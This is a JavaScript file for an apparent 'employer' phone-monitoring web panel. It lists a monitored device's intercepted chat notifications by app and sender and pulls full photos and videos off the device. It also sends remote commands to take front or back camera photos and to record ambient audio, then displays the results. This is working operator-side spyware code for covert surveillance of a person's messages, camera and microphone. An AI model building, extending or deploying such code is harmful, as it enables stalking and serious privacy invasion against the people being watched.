function logout() { localStorage.clear(); window.location.href = '/'; }

function escapeHtml(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function openLightbox(img) {
    document.getElementById('lightbox-img').src = img.dataset.src;
    document.getElementById('lightbox').style.display = 'flex';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
}

function showTab(name, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + name).classList.add('active');
    el.classList.add('active');
}

let allNotifications = [];
let currentIncomingApp = '';

fetch(window.location.href.replace('/device', '/device/notifications-data'))
    .then(function(r) { return r.json(); })
    .then(function(data) { allNotifications = data.notifications || []; });

function showDirection(dir) {
    document.getElementById('msg-incoming').style.display = dir === 'incoming' ? 'block' : 'none';
    document.getElementById('msg-outgoing').style.display = dir === 'outgoing' ? 'block' : 'none';
    document.getElementById('btn-incoming').classList.toggle('active', dir === 'incoming');
    document.getElementById('btn-outgoing').classList.toggle('active', dir === 'outgoing');
}

function backFromChats() {
    document.getElementById('incoming-chats').style.display = 'none';
    document.getElementById('incoming-apps').style.display = 'grid';
}

function backFromMessages() {
    document.getElementById('incoming-messages').style.display = 'none';
    document.getElementById('incoming-chats').style.display = 'block';
}

function showIncomingChats(app) {
    currentIncomingApp = app;
    document.getElementById('incoming-apps').style.display = 'none';
    const appMessages = allNotifications.filter(function(n) {
        return n.app === app && n.direction !== 'outgoing';
    });
    const senders = [...new Set(appMessages.map(function(n) { return n.sender; }))];

    document.getElementById('incoming-chats').style.display = 'block';
    const list = document.getElementById('incoming-chats-list');

    if (senders.length === 0) {
        list.innerHTML = '<p class="no-data">No chats found</p>';
        return;
    }

    list.innerHTML = senders.map(function(sender) {
        const msgs = appMessages.filter(function(n) { return n.sender === sender; });
        const latest = msgs[msgs.length - 1];
        return '<div class="chat-item" data-sender="' + escapeHtml(sender) + '">'
            + '<div style="min-width:0">'
            + '<div class="chat-name">' + escapeHtml(sender) + '</div>'
            + '<div class="chat-preview">' + (latest ? escapeHtml(latest.message.substring(0, 60)) : '') + '</div>'
            + '</div>'
            + '<div class="chat-meta">'
            + '<div class="chat-time">' + (latest ? new Date(latest.received_at).toLocaleString() : '') + '</div>'
            + '<div class="chat-count">' + msgs.length + '</div>'
            + '</div></div>';
    }).join('');
}

// Chat list navigation — delegated so sender names with quotes/apostrophes work safely
document.getElementById('incoming-chats-list').addEventListener('click', function(e) {
    const item = e.target.closest('.chat-item');
    if (item) showIncomingMessages(item.dataset.sender);
});

function showIncomingMessages(sender) {
    const msgs = allNotifications
        .filter(function(n) { return n.app === currentIncomingApp && n.sender === sender && n.direction !== 'outgoing'; })
        .sort(function(a, b) { return new Date(a.received_at) - new Date(b.received_at); });

    document.getElementById('incoming-chats').style.display = 'none';
    document.getElementById('incoming-messages').style.display = 'block';
    document.getElementById('incoming-messages-title').textContent = sender;

    const list = document.getElementById('incoming-messages-list');
    list.innerHTML = msgs.map(function(m) {
        return '<div class="msg-row">'
            + '<div class="msg-bubble">'
            + '<div class="text">' + escapeHtml(m.message) + '</div>'
            + '<div class="msg-time">' + new Date(m.received_at).toLocaleString() + '</div>'
            + '</div></div>';
    }).join('');
    list.scrollTop = list.scrollHeight;
}

async function requestDownload(token, filename, image_id) {
    const btn = event.target;
    btn.textContent = 'Requesting...';
    btn.disabled = true;

    const res = await fetch('/employer/request-download', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token, filename, image_id })
    });
    const data = await res.json();

    if (data.success) {
        btn.textContent = 'Waiting for device...';
        const interval = setInterval(async function() {
            const dlRes = await fetch('/employer/download-full', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token, filename })
            });
            const dlData = await dlRes.json();
            if (dlData.success) {
                clearInterval(interval);
                const isVideo = /\.(mp4|3gp|webm|mkv|mov|avi|m4v)$/i.test(filename);
                const mime = isVideo ? 'video/mp4' : 'image/jpeg';
                const link = document.createElement('a');
                link.href = 'data:' + mime + ';base64,' + dlData.image;
                link.download = filename;
                link.click();
                btn.textContent = 'Downloaded ✅';
            }
        }, 10000);
    }
}

const deviceToken = new URLSearchParams(window.location.search).get('token');

async function sendCommand(type) {
    const duration = document.getElementById('record-duration')?.value || 30;
    const facing = document.getElementById('camera-facing')?.value || 'back';

    const res = await fetch('/employer/command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token: deviceToken, type, duration: parseInt(duration), facing })
    });
    const data = await res.json();
    const msg = document.getElementById('remote-msg');

    if (data.success) {
        msg.style.display = 'block';
        msg.className = 'msg msg-success';
        msg.textContent = type === 'record_ambient'
            ? 'Recording command sent! Audio will appear below within 2 minutes + recording duration.'
            : 'Photo command sent! Image will appear below within 2 minutes.';
        setTimeout(loadRemoteResults, 10000);
    } else {
        msg.style.display = 'block';
        msg.className = 'msg msg-error';
        msg.textContent = data.message || 'Failed to send command';
    }
}

async function loadRemoteResults() {
    const res = await fetch('/employer/command-results', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token: deviceToken })
    });
    const data = await res.json();
    const container = document.getElementById('remote-results');

    if (!data.commands || data.commands.length === 0) {
        container.innerHTML = '<p class="no-data">No results yet</p>';
        return;
    }

    container.innerHTML = data.commands.map(function(cmd) {
        const date = new Date(cmd.completed_at).toLocaleString();
        if (cmd.type === 'take_photo' && cmd.result) {
            return '<div class="result-card">'
                + '<div class="result-head"><span class="result-label">📷 Photo</span><span class="result-date">' + date + '</span></div>'
                + '<img src="data:image/jpeg;base64,' + cmd.result + '" data-src="data:image/jpeg;base64,' + cmd.result + '" onclick="openLightbox(this)"/>'
                + '<a class="result-link" href="data:image/jpeg;base64,' + cmd.result + '" download="remote_photo_' + date + '.jpg">⬇️ Download</a>'
                + '</div>';
        } else if (cmd.type === 'record_ambient' && cmd.result) {
            return '<div class="result-card">'
                + '<div class="result-head"><span class="result-label">🎙️ Ambient Recording (' + (cmd.duration || 30) + 's)</span><span class="result-date">' + date + '</span></div>'
                + '<audio controls src="data:audio/mp4;base64,' + cmd.result + '"></audio>'
                + '<a class="result-link" href="data:audio/mp4;base64,' + cmd.result + '" download="ambient_' + date + '.mp4">⬇️ Download</a>'
                + '</div>';
        }
        return '<div class="result-card">'
            + '<div class="result-head"><span class="result-label">' + escapeHtml(cmd.type) + '</span><span class="result-date">' + date + '</span></div>'
            + '<span>' + (cmd.status === 'failed' ? '❌ Failed' : '⏳ Pending') + '</span>'
            + '</div>';
    }).join('');
}

// Auto-load results when remote tab opened
loadRemoteResults();
// Refresh every 30 seconds
setInterval(loadRemoteResults, 30000);
